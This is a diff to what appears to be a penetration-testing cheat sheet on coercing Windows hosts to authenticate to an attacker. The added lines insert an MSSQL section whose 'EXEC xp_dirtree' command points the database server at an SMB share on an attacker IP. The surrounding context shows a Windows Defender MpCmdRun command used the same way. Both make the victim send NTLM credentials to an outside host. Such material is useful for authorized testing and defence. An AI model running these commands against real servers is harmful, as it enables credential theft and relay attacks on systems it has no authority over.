@@ -81,6 +81,12 @@ If you are already inside the Windows machine you can force Windows to connect t
 C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
 ```
 
+### MSSQL
+
+```sql
+EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
+```
+
 ## HTML injection
 
 ### Via email
